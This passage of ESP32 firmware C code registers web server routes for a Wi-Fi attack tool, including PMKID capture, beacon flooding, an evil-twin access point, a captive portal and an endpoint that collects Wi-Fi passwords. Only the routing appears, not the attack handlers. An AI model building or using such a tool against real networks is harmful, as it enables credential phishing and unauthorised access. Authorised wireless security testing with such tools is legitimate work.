        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/pmkid/stop", .method = HTTP_POST, .handler = stop_pmkid_handler});

        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/attack/auto/start", .method = HTTP_POST, .handler = start_auto_hunt_handler});

        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/attack/beacon/start", .method = HTTP_POST, .handler = api_beacon_start});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/attack/beacon/stop", .method = HTTP_POST, .handler = api_beacon_stop});

        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/router/connect", .method = HTTP_POST, .handler = router_connect_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/router/disconnect", .method = HTTP_POST, .handler = router_disconnect_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/router/status", .method = HTTP_GET, .handler = router_status_handler});

        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/attack/eviltwin/start", .method = HTTP_POST, .handler = start_evil_twin_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/attack/eviltwin/stop", .method = HTTP_POST, .handler = stop_evil_twin_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/attack/eviltwin/status", .method = HTTP_GET, .handler = get_evil_twin_status_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/get_wifi_password", .method = HTTP_POST, .handler = get_password_handler});

        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/*", .method = HTTP_GET, .handler = captive_portal_handler});
        ESP_LOGI(TAG, "Web server started on port %d", config.server_port);
    } else {
        ESP_LOGE(TAG, "Error starting server!");
    }
}

void web_server_stop(void) {
    if (server) {
        httpd_stop(server);
        server = NULL;
    }
}
